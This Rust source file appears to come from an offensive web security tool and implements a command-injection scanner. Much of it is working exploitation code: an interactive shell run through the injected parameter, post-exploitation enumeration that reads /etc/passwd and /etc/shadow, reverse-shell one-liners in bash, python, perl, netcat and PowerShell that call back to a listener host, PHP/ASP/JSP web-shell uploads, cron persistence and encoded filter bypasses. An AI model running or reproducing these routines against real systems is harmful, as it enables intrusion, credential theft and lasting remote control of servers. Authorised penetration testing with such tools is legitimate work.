use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::detection::analyzer::{Finding, Severity};
use std::time::{Duration, Instant};
use std::io::{self, Write};
use anyhow::Result;
use serde::{Deserialize, Serialize};
use colored::Colorize;

/// Command Injection vulnerability scanner
pub struct CmdInjectionScanner {
    client: HttpClient,
    findings: Vec<Finding>,
    target: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandResult {
    pub command: String,
    pub output: String,
    pub success: bool,
    pub execution_time: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PostExploitationData {
    pub hostname: Option<String>,
    pub whoami: Option<String>,
    pub uname: Option<String>,
    pub ifconfig: Option<String>,
    pub netstat: Option<String>,
    pub passwd: Option<String>,
    pub shadow: Option<String>,
    pub processes: Option<String>,
    pub cwd: Option<String>,
    pub env: Option<String>,
}

#[derive(Debug, Clone)]
pub struct ShellSession {
    pub target_url: String,
    pub parameter: String,
    pub shell_type: ShellType,
    pub working_directory: String,
    pub user: String,
}

#[derive(Debug, Clone)]
pub enum ShellType {
    Bash,
    Sh,
    Zsh,
    Fish,
    PowerShell,
    CMD,
}

impl CmdInjectionScanner {
    pub fn new(target: String, timeout_secs: u64, insecure: bool) -> Result<Self> {
        let client = HttpClient::new(timeout_secs, insecure)?;
        Ok(Self {
            client,
            findings: Vec::new(),
            target,
        })
    }

    /// Execute command via injection and capture output.
    /// Uses UrlUtil::inject_param so existing query params are preserved.
    pub async fn execute_command(&self, url: &str, param: &str, command: &str) -> Result<CommandResult> {
        use crate::utils::url::UrlUtil;
        let start_time = Instant::now();

        let payloads = vec![
            format!("; {} 2>&1", command),
            format!("| {} 2>&1", command),
            format!("& {} 2>&1", command),
            format!("`{}`", command),
            format!("$({})", command),
            format!("&& {} 2>&1", command),
            format!("|| {} 2>&1", command),
        ];

        for payload in payloads {
            let request_url = UrlUtil::inject_param(url, param, &payload);
            let request = HttpRequest::get(&request_url);

            if let Ok(response) = self.client.send(request).await {
                if let Some(output) = self.extract_command_output(&response.body) {
                    return Ok(CommandResult {
                        command: command.to_string(),
                        output,
                        success: true,
                        execution_time: start_time.elapsed().as_millis() as u64,
                    });
                }
            }
        }

        Ok(CommandResult {
            command: command.to_string(),
            output: String::new(),
            success: false,
            execution_time: start_time.elapsed().as_millis() as u64,
        })
    }

    /// Start interactive shell session after successful exploitation.
    ///
    /// Uses `tokio::task::spawn_blocking` for stdin reads so the async runtime
    /// thread is never blocked — the old `io::stdin().read_line()` call would
    /// stall the entire tokio executor.
    pub async fn start_interactive_shell(&self, url: &str, param: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        println!("{}", "[+] Starting interactive shell session...".green());

        let shell_info = self.detect_shell_environment(url, param).await?;

        let mut session = ShellSession {
            target_url: url.to_string(),
            parameter: param.to_string(),
            shell_type: ShellType::Bash,
            working_directory: shell_info.cwd.unwrap_or_else(|| "/".to_string()),
            user: shell_info.whoami.unwrap_or_else(|| "unknown".to_string()),
        };

        println!("{}", format!("[+] Connected to {}@{}:{}",
            session.user.cyan(), url.bright_blue(), session.working_directory.green()));

        loop {
            // Print prompt
            print!("{}@{}:{}$ ", session.user, url, session.working_directory);
            io::stdout().flush()?;

            // Read a line without blocking the tokio runtime
            let line = tokio::task::spawn_blocking(|| {
                let mut buf = String::new();
                io::stdin().read_line(&mut buf).map(|_| buf)
            }).await??;

            let command = line.trim();

            if command.is_empty() { continue; }
            if command == "exit" || command == "quit" {
                println!("{}", "[+] Exiting shell session".yellow());
                break;
            }
            if command == "help" {
                self.show_shell_help();
                continue;
            }

            if command.starts_with("cd ") {
                let new_dir = command[3..].trim();
                if let Ok(result) = self.change_directory(&session, new_dir).await {
                    if result.success {
                        session.working_directory = self.extract_current_directory(&result.output);
                        println!("{}", format!("Changed to: {}", session.working_directory).green());
                    } else {
                        println!("{}", "cd: No such file or directory".red());
                    }
                }
                continue;
            }

            match self.execute_command(url, param, command).await {
                Ok(result) => {
                    if result.success {
                        print!("{}", result.output);
                        io::stdout().flush()?;
                    } else {
                        println!("{}", format!("Command failed: {}", command).red());
                    }
                }
                Err(e) => println!("{}", format!("Error: {}", e).red()),
            }
        }

        Ok(())
    }

    /// Detect shell environment
    async fn detect_shell_environment(&self, url: &str, param: &str) -> Result<PostExploitationData, Box<dyn std::error::Error + Send + Sync>> {
        let mut data = PostExploitationData {
            hostname: None,
            whoami: None,
            uname: None,
            ifconfig: None,
            netstat: None,
            passwd: None,
            shadow: None,
            processes: None,
            cwd: None,
            env: None,
        };

        // Get current user
        if let Ok(result) = self.execute_command(url, param, "whoami").await {
            if result.success {
                data.whoami = Some(result.output.trim().to_string());
            }
        }

        // Get current directory
        if let Ok(result) = self.execute_command(url, param, "pwd").await {
            if result.success {
                data.cwd = Some(result.output.trim().to_string());
            }
        }

        // Get shell type
        if let Ok(result) = self.execute_command(url, param, "echo $0").await {
            if result.success {
                let shell_path = result.output.trim();
                data.env = Some(shell_path.to_string());
            }
        }

        Ok(data)
    }

    /// Change directory
    async fn change_directory(&self, session: &ShellSession, new_dir: &str) -> Result<CommandResult, Box<dyn std::error::Error + Send + Sync>> {
        let cd_command = if new_dir.starts_with('/') {
            format!("cd {}", new_dir)
        } else {
            format!("cd {}/{}", session.working_directory, new_dir)
        };

        // Try to change directory and then get current directory
        if let Ok(_) = self.execute_command(&session.target_url, &session.parameter, &cd_command).await {
            // Verify directory change
            if let Ok(pwd_result) = self.execute_command(&session.target_url, &session.parameter, "pwd").await {
                if pwd_result.success {
                    return Ok(pwd_result);
                }
            }
        }

        Ok(CommandResult {
            command: cd_command,
            output: String::new(),
            success: false,
            execution_time: 0,
        })
    }

    /// Extract current directory from pwd output
    fn extract_current_directory(&self, output: &str) -> String {
        let trimmed = output.trim();
        if trimmed.starts_with('/') {
            trimmed.to_string()
        } else {
            "/".to_string()
        }
    }

    /// Show shell help
    fn show_shell_help(&self) {
        println!("{}", "\n=== Interactive Shell Help ===".bright_blue());
        println!("Available commands:");
        println!("  cd <path>     - Change directory");
        println!("  pwd           - Show current directory");
        println!("  ls, dir       - List directory contents");
        println!("  whoami        - Show current user");
        println!("  hostname      - Show system hostname");
        println!("  ps aux        - Show running processes");
        println!("  netstat -an   - Show network connections");
        println!("  cat <file>    - Display file contents");
        println!("  help          - Show this help");
        println!("  exit, quit    - Exit shell session");
        println!("Any other command will be executed on the target system.");
        println!("{}", "=============================".bright_blue());
    }

    /// Extract command output from response
    fn extract_command_output(&self, response_text: &str) -> Option<String> {
        let lines: Vec<&str> = response_text.lines().collect();
        let mut output_lines = Vec::new();

        for line in lines {
            let trimmed = line.trim();
            
            if trimmed.len() > 3 
                && !trimmed.starts_with('<') 
                && !trimmed.starts_with("http")
                && !trimmed.contains("DOCTYPE")
                && !trimmed.contains("html")
                && !trimmed.contains("body")
                && !trimmed.contains("div")
                && !trimmed.contains("script") {
                
                if self.looks_like_command_output(trimmed) {
                    output_lines.push(trimmed);
                }
            }
        }

        if !output_lines.is_empty() {
            Some(output_lines.join("\n"))
        } else {
            None
        }
    }

    /// Check if text looks like command output
    fn looks_like_command_output(&self, text: &str) -> bool {
        let command_patterns = [
            "root:", "uid=", "gid=", "daemon:", "www-data:", "apache:",
            "Linux", "Darwin", "MINGW", "CYGWIN",
            "total ", "drwx", "-rw-", "lrwx",
            "tcp ", "udp ", "LISTEN", "ESTABLISHED",
            "PID", "USER", "COMMAND", "CPU", "MEM",
        ];

        for pattern in &command_patterns {
            if text.contains(pattern) {
                return true;
            }
        }

        if text.contains(':') && text.len() > 10 {
            return true;
        }

        false
    }

    /// Deploy reverse shell via command injection
    pub async fn deploy_reverse_shell(&self, url: &str, param: &str, listener_ip: &str, port: u16) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
        let shells = vec![
            format!("bash -i >& /dev/tcp/{}/{} 0>&1", listener_ip, port),
            format!("python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{}\",{}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'", listener_ip, port),
            format!("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{}',{}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); Write-Host $data; }}\"", listener_ip, port),
            format!("nc -e /bin/sh {} {}", listener_ip, port),
            format!("rm -f /tmp/p; mknod /tmp/p p; nc -l -p {} 0/tmp/p", port),
            format!("perl -e 'use Socket;$i=\"{}\";$p={};socket(S,2,1,6);connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'", listener_ip, port),
        ];

        for shell in shells {
            if let Ok(_) = self.execute_command(url, param, &shell).await {
                return Ok(format!("Reverse shell deployed to {}:{}", listener_ip, port));
            }
        }

        Err("Reverse shell deployment failed".into())
    }

    /// Test Unix commands availability
    pub async fn test_unix_commands(&self, url: &str, param: &str) -> Result<Vec<String>, Box<dyn std::error::Error + Send + Sync>> {
        let commands = vec![
            "ls", "cat", "ps", "whoami", "id", "uname", "pwd", "netstat", "ifconfig", "df", "free", "top", "kill", "chmod", "chown", "tar", "grep", "find", "wget", "curl", "python", "perl", "nc", "ssh"
        ];

        let mut available_commands = Vec::new();

        for command in commands {
            if let Ok(result) = self.execute_command(url, param, format!("which {}", command).as_str()).await {
                if result.success && !result.output.trim().is_empty() {
                    available_commands.push(format!("{}: {}", command.green(), result.output.trim()));
                }
            }
        }

        Ok(available_commands)
    }

    /// Perform post-exploitation enumeration
    pub async fn post_exploitation(&self, url: &str, param: &str) -> Result<PostExploitationData, Box<dyn std::error::Error + Send + Sync>> {
        let mut data = PostExploitationData {
            hostname: None,
            whoami: None,
            uname: None,
            ifconfig: None,
            netstat: None,
            passwd: None,
            shadow: None,
            processes: None,
            cwd: None,
            env: None,
        };

        // System information
        if let Ok(result) = self.execute_command(url, param, "hostname").await {
            if result.success {
                data.hostname = Some(result.output);
            }
        }

        if let Ok(result) = self.execute_command(url, param, "whoami").await {
            if result.success {
                data.whoami = Some(result.output);
            }
        }

        if let Ok(result) = self.execute_command(url, param, "uname -a").await {
            if result.success {
                data.uname = Some(result.output);
            }
        }

        // Network information
        if let Ok(result) = self.execute_command(url, param, "ip addr show || ifconfig -a").await {
            if result.success {
                data.ifconfig = Some(result.output);
            }
        }

        if let Ok(result) = self.execute_command(url, param, "netstat -tuln || netstat -an").await {
            if result.success {
                data.netstat = Some(result.output);
            }
        }

        // User information
        if let Ok(result) = self.execute_command(url, param, "cat /etc/passwd").await {
            if result.success {
                data.passwd = Some(result.output);
            }
        }

        if let Ok(result) = self.execute_command(url, param, "cat /etc/shadow").await {
            if result.success {
                data.shadow = Some(result.output);
            }
        }

        // Process information
        if let Ok(result) = self.execute_command(url, param, "ps aux || ps -ef").await {
            if result.success {
                data.processes = Some(result.output);
            }
        }

        // Current directory
        if let Ok(result) = self.execute_command(url, param, "pwd").await {
            if result.success {
                data.cwd = Some(result.output);
            }
        }

        // Environment variables
        if let Ok(result) = self.execute_command(url, param, "env").await {
            if result.success {
                data.env = Some(result.output);
            }
        }

        Ok(data)
    }

    /// Upload web shell via command injection
    pub async fn upload_web_shell(&self, url: &str, param: &str, shell_path: &str) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
        let php_shell = "<?php system($_GET['cmd']); ?>";
        let asp_shell = "<%eval request(\"c\")%>";
        let jsp_shell = "<%Runtime.getRuntime().exec(request.getParameter(\"c\"));%>";

        let asp_path = format!("{}.asp", shell_path);
        let jsp_path = format!("{}.jsp", shell_path);
        
        let shells = vec![
            (shell_path, &php_shell, "PHP"),
            (asp_path.as_str(), &asp_shell, "ASP"),
            (jsp_path.as_str(), &jsp_shell, "JSP"),
        ];

        for (path, content, shell_type) in shells {
            let upload_cmd = format!("echo '{}' > {}", content, path);
            
            if let Ok(result) = self.execute_command(url, param, &upload_cmd).await {
                if result.success {
                    return Ok(format!("{} web shell uploaded to {}", shell_type, path));
                }
            }
        }

        Err("Web shell upload failed".into())
    }

    /// Check for web shell access
    pub async fn verify_shell_access(&self, base_url: &str, shell_path: &str) -> Result<bool, Box<dyn std::error::Error + Send + Sync>> {
        let shell_url = format!("{}/{}?cmd=whoami", base_url.trim_end_matches('/'), shell_path);
        
        if let Ok(response) = self.client.get(&shell_url).await {
            let response_text = response.body;
            
            Ok(response_text.contains("root") 
                || response_text.contains("www-data") 
                || response_text.contains("apache")
                || response_text.contains("nobody")
                || response_text.contains("daemon"))
        } else {
            Ok(false)
        }
    }

    /// Persistence via cron job
    pub async fn setup_persistence(&self, url: &str, param: &str, listener_ip: &str, port: u16) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
        let persistence_commands = vec![
            format!("echo '* * * * * /bin/bash -i >& /dev/tcp/{}/{} 0>&1' | crontab -", listener_ip, port),
            format!("(crontab -l; echo '* * * * * /bin/bash -i >& /dev/tcp/{}/{} 0>&1') | crontab -", listener_ip, port),
            format!("echo '*/5 * * * * /bin/bash -i >& /dev/tcp/{}/{} 0>&1' >> /etc/crontab", listener_ip, port),
        ];

        for cmd in persistence_commands {
            if let Ok(result) = self.execute_command(url, param, &cmd).await {
                if result.success {
                    return Ok("Persistence established via cron job".to_string());
                }
            }
        }

        Err("Persistence setup failed".into())
    }

    /// Scan a specific URL for command injection vulnerabilities
    pub async fn scan_url(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        println!("[*] Scanning {} for command injection vulnerabilities (target: {})", url, self.target);
        
        let mut findings = Vec::new();
        
        // Test each parameter with command injection payloads
        for param in params {
            println!("  [*] Testing parameter: {}", param);
            
            if let Some(finding) = self.test_param_for_cmd_injection(url, param).await {
                findings.push(finding.clone());
                self.findings.push(finding);
            }
        }
        
        Ok(findings)
    }

    /// Test a specific parameter for command injection vulnerabilities
    async fn test_param_for_cmd_injection(&self, url: &str, param: &str) -> Option<Finding> {
        // Get baseline response first
        let baseline_response = match self.make_request(url, param, "baseline_test_123").await {
            Ok(response) => response.body,
            Err(_) => String::new(),
        };
        
        // Command injection payloads from Samurai strategies
        let payloads = vec![
            ";id",
            "|id", 
            "&id",
            "`id`",
            "$(id)",
            ";whoami",
            "|whoami",
            "&whoami",
            ";uname -a",
            "|uname -a",
            ";cat /etc/passwd",
            "|cat /etc/passwd",
            ";ls -la",
            "|ls -la",
            ";pwd",
            "|pwd",
            "& dir",
            "| dir",
            "; dir",
            "& whoami",
        ];
        
        for payload in payloads.iter().take(20) {
            let response = self.make_request(url, param, payload).await;
            
            match response {
                Ok(resp) => {
                    let response_text = resp.body;
                    
                    // Must be different from baseline to indicate command execution
                    if response_text == baseline_response {
                        continue; // No change, skip
                    }
                    
                    // Check for command injection indicators in response
                    if self.contains_command_injection_indicators(&response_text, payload) {
                        return Some(
                            Finding::new(
                                url,
                                Severity::Critical,
                                &format!("Command Injection in parameter '{}'", param),
                                &format!("The parameter '{}' appears to be vulnerable to command injection", param)
                            )
                            .with_evidence(&format!("Payload: {}", payload))
                            .with_remediation("Validate and sanitize all input parameters. Use allow-lists for commands.")
                        );
                    }
                }
                Err(_) => {
                    // Request failed, might indicate a vulnerability but requires more analysis
                }
            }
        }
        
        None
    }

    /// Check response for actual Unix command output
    fn contains_unix_command_output(&self, response: &str, payload: &str) -> bool {
        let lower_response = response.to_lowercase();
        
        // Require MULTIPLE indicators to reduce false positives
        // A single word like "root" or "daemon" can appear in normal web content
        let mut indicator_count = 0;
        
        // Primary indicators - strong evidence of command output
        let primary_indicators = [
            "uid=", "gid=", "groups=",
            "drwxr-xr-x", "rw-r--r--",  // ls -la output
            "/bin/bash", "/bin/sh", "/bin/zsh", // passwd file entries
            "permission denied", "sh:", "bash:",
        ];
        
        for pattern in &primary_indicators {
            if lower_response.contains(pattern) {
                indicator_count += 2; // Strong indicator
            }
        }
        
        // Secondary indicators - weaker evidence, need multiple
        let secondary_indicators = [
            "whoami", "uname=", 
            "/etc/passwd", "/etc/shadow",
            "netstat", "ifconfig", "eth0", "wlan0",
        ];
        
        for pattern in &secondary_indicators {
            if lower_response.contains(pattern) {
                indicator_count += 1;
            }
        }
        
        // Need at least 3 points to trigger (either one strong or multiple weak)
        if indicator_count >= 3 {
            return true;
        }
        
        // Check for specific command outputs with stricter matching
        if payload.contains("id") && 
           (lower_response.contains("uid=") && lower_response.contains("gid=")) {
            return true;
        }
        
        if payload.contains("whoami") && 
           (lower_response.contains("root") || lower_response.contains("admin")) &&
           lower_response.lines().any(|line| line.trim() == "root" || line.trim().contains("root@")) {
            return true;
        }
        
        if payload.contains("uname") && 
           (lower_response.contains("linux") || lower_response.contains("darwin")) &&
           lower_response.contains("kernel") {
            return true;
        }
        
        false
    }

    /// Check response for actual Windows command output
    fn contains_windows_command_output(&self, response: &str, payload: &str) -> bool {
        let lower_response = response.to_lowercase();
        
        // Require multiple indicators for Windows command output
        let mut indicator_count = 0;
        
        // Strong indicators
        let strong_indicators = [
            "volume serial number",
            "bytes free",
            "bytes available",
            "user accounts for",
            "system manufacturer",
            "system model",
            "bios version",
        ];
        
        for pattern in &strong_indicators {
            if lower_response.contains(pattern) {
                indicator_count += 2;
            }
        }
        
        // Need strong evidence for Windows
        if indicator_count >= 2 {
            return true;
        }
        
        // Check for win.ini specific content structure
        if payload.contains("win.ini") && 
           lower_response.contains("[extensions]") && 
           lower_response.contains("for 16-bit app support") {
            return true;
        }
        
        // Check for dir command output structure
        if payload.contains("dir") && 
           lower_response.contains("directory of") && 
           lower_response.contains("bytes") &&
           lower_response.contains("<dir>") {
            return true;
        }
        
        false
    }

    /// Check response for command injection indicators (legacy method)
    fn contains_command_injection_indicators(&self, response: &str, payload: &str) -> bool {
        self.contains_unix_command_output(response, payload) || 
        self.contains_windows_command_output(response, payload)
    }

    /// Helper method to make requests with specific parameter and value
    async fn make_request(&self, url: &str, param: &str, value: &str) -> Result<crate::http::response::HttpResponse> {
        use crate::utils::url::UrlUtil;
        let request_url = UrlUtil::inject_param(url, param, value);
        let request = HttpRequest::get(&request_url);
        self.client.send(request).await
    }

    /// Perform a comprehensive command injection scan with multiple techniques
    pub async fn comprehensive_scan(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        println!("[*] Performing comprehensive command injection scan on {}", url);
        
        let mut findings = Vec::new();
        
        // Test each parameter with different command injection techniques
        for param in params {
            println!("  [*] Comprehensive test for parameter: {}", param);
            
            // Test with Unix command injection
            if let Some(finding) = self.test_unix_injection_vulnerability(url, param).await {
                findings.push(finding);
            }
            
            // Test with Windows command injection
            if let Some(finding) = self.test_windows_commands(url, param).await {
                findings.push(finding);
            }
            
            // Test with time-based commands
            if let Some(finding) = self.test_time_based_commands(url, param).await {
                findings.push(finding);
            }
        }
        
        Ok(findings)
    }

    /// Test for Unix command injection with real OS command execution detection
    async fn test_unix_injection_vulnerability(&self, url: &str, param: &str) -> Option<Finding> {
        let unix_payloads = vec![
            (";id", "Unix id command"),
            ("|id", "Unix id command with pipe"),
            ("&id", "Unix id command with background"),
            ("&&id", "Unix id command with AND"),
            ("`id`", "Unix id command with backticks"),
            ("$(id)", "Unix id command with substitution"),
            (";whoami", "Unix whoami command"),
            (";uname -a", "Unix uname command"),
            (";pwd", "Unix pwd command"),
            (";ps aux", "Unix ps command"),
            (";cat /etc/passwd", "Unix cat command"),
            (";ls -la /", "Unix ls command"),
            (";netstat -an", "Unix netstat command"),
            (";ifconfig", "Unix ifconfig command"),
            (";env", "Unix env command"),
        ];
        
        for (payload, description) in unix_payloads {
            let start = Instant::now();
            let response = self.make_request(url, param, payload).await;
            let elapsed = start.elapsed();
            
            match response {
                Ok(resp) => {
                    let response_text = resp.body;
                    
                    if self.contains_unix_command_output(&response_text, payload) {
                        return Some(
                            Finding::new(
                                url,
                                Severity::Critical,
                                &format!("Unix Command Injection in parameter '{}'", param),
                                &format!("The parameter '{}' is vulnerable to Unix command injection: {}", param, description)
                            )
                            .with_evidence(&format!("Payload: {} | Response time: {:?}", payload, elapsed))
                            .with_remediation("Never use user input directly in system commands. Use allow-lists and proper input validation.")
                        );
                    }
                    
                    if payload.contains("sleep") || payload.contains("ping") {
                        if elapsed > Duration::from_secs(3) {
                            return Some(
                                Finding::new(
                                    url,
                                    Severity::Critical,
                                    &format!("Time-based Unix Command Injection in parameter '{}'", param),
                                    &format!("Parameter '{}' executes time-delaying Unix commands", param)
                                )
                                .with_evidence(&format!("Payload: {} | Execution time: {:?}", payload, elapsed))
                                .with_remediation("Implement proper input validation and avoid executing user-controlled commands.")
                            );
                        }
                    }
                }
                Err(_) => {
                    if elapsed > Duration::from_secs(5) {
                        return Some(
                            Finding::new(
                                url,
                                Severity::Critical,
                                &format!("Unix Command Injection (Request Timeout) in parameter '{}'", param),
                                &format!("Parameter '{}' causes request timeouts, likely due to command execution", param)
                            )
                            .with_evidence(&format!("Payload: {} | Request timeout after: {:?}", payload, elapsed))
                            .with_remediation("Implement proper input validation and avoid executing user-controlled commands.")
                        );
                    }
                }
            }
        }
        
        None
    }

    /// Test for Windows command injection with real OS command execution detection
    async fn test_windows_commands(&self, url: &str, param: &str) -> Option<Finding> {
        let windows_payloads = vec![
            ("& type C:\\Windows\\win.ini", "Windows type command"),
            ("| type C:\\Windows\\win.ini", "Windows type command with pipe"),
            ("; dir", "Windows dir command"),
            ("| dir", "Windows dir command with pipe"),
            ("& dir", "Windows dir command with background"),
            ("&& dir", "Windows dir command with AND"),
            ("; echo %USERNAME%", "Windows echo username"),
            ("& hostname", "Windows hostname command"),
            ("| hostname", "Windows hostname with pipe"),
            ("; whoami", "Windows whoami command"),
            ("; systeminfo", "Windows systeminfo command"),
            ("; net user", "Windows net user command"),
            ("; ipconfig /all", "Windows ipconfig command"),
            ("; tasklist", "Windows tasklist command"),
            ("; wmic os get", "Windows wmic command"),
        ];
        
        for (payload, description) in windows_payloads {
            let start = Instant::now();
            let response = self.make_request(url, param, payload).await;
            let elapsed = start.elapsed();
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                if self.contains_windows_command_output(&response_text, payload) {
                    return Some(
                        Finding::new(
                            url,
                            Severity::Critical,
                            &format!("Windows Command Injection in parameter '{}'", param),
                            &format!("The parameter '{}' is vulnerable to Windows command injection: {}", param, description)
                        )
                        .with_evidence(&format!("Payload: {} | Response time: {:?}", payload, elapsed))
                        .with_remediation("Never use user input directly in system commands. Use allow-lists and proper input validation.")
                    );
                }
                
                if payload.contains("ping") || payload.contains("timeout") {
                    if elapsed > Duration::from_secs(3) {
                        return Some(
                            Finding::new(
                                url,
                                Severity::Critical,
                                &format!("Time-based Windows Command Injection in parameter '{}'", param),
                                &format!("Parameter '{}' executes time-delaying Windows commands", param)
                            )
                            .with_evidence(&format!("Payload: {} | Execution time: {:?}", payload, elapsed))
                            .with_remediation("Implement proper input validation and avoid executing user-controlled commands.")
                        );
                    }
                }
            }
        }
        
        None
    }

    /// Test for time-based command injection by measuring actual response delay.
    /// A response body containing "sleep" is NOT evidence of injection —
    /// only a measured delay >= the injected sleep duration is.
    async fn test_time_based_commands(&self, url: &str, param: &str) -> Option<Finding> {
        // (payload, expected_delay_secs)
        let time_payloads = [
            ("; sleep 5",           5u64),
            ("| sleep 5",           5),
            ("&& sleep 5",          5),
            ("`sleep 5`",           5),
            ("$(sleep 5)",          5),
            ("; ping -c 5 127.0.0.1", 4),
            ("| ping -c 5 127.0.0.1", 4),
        ];

        // Establish baseline response time (average of 2 requests)
        let mut baseline_ms = 0u64;
        for _ in 0..2 {
            let t = Instant::now();
            let _ = self.make_request(url, param, "baseline_oxide_time").await;
            baseline_ms += t.elapsed().as_millis() as u64;
        }
        baseline_ms /= 2;

        for (payload, expected_secs) in &time_payloads {
            let start = Instant::now();
            let _ = self.make_request(url, param, payload).await;
            let elapsed_ms = start.elapsed().as_millis() as u64;
            let threshold_ms = baseline_ms + (expected_secs * 1000 * 8 / 10); // 80% of expected delay

            if elapsed_ms >= threshold_ms {
                return Some(
                    Finding::new(
                        url,
                        Severity::Critical,
                        &format!("Time-Based Command Injection in parameter '{}'", param),
                        &format!("Parameter '{}' caused a {}ms delay (baseline: {}ms, threshold: {}ms)",
                            param, elapsed_ms, baseline_ms, threshold_ms)
                    )
                    .with_evidence(&format!("Payload: {} | Elapsed: {}ms | Baseline: {}ms",
                        payload, elapsed_ms, baseline_ms))
                    .with_remediation("Never pass user input to system commands. Use allow-lists and sandboxed execution.")
                );
            }
        }
        None
    }

    /// Test with alternative encodings to bypass filters
    pub async fn test_encoded_commands(&self, url: &str, param: &str) -> Option<Finding> {
        use crate::payload::encoder::Encoder;
        
        let base_payload = ";id";
        let encoded_variants = vec![
            Encoder::url_encode(base_payload),
            Encoder::base64_encode(base_payload),
            Encoder::hex_encode(base_payload),
        ];
        
        for encoded_payload in &encoded_variants {
            let response = self.make_request(url, param, encoded_payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                if self.contains_command_injection_indicators(&response_text, base_payload) {
                    return Some(
                        Finding::new(
                            url,
                            Severity::Critical,
                            &format!("Encoded Command Injection in parameter '{}'", param),
                            &format!("The parameter '{}' is vulnerable to encoded command injection", param)
                        )
                        .with_evidence(&format!("Original: {} | Encoded: {}", base_payload, encoded_payload))
                        .with_remediation("Implement comprehensive input validation that handles encoded payloads.")
                    );
                }
            }
        }
        
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_cmd_injection_scanner_creation() {
        let scanner = CmdInjectionScanner::new("https://example.com".to_string(), 30, true).unwrap();
        assert_eq!(scanner.target, "https://example.com");
    }
}
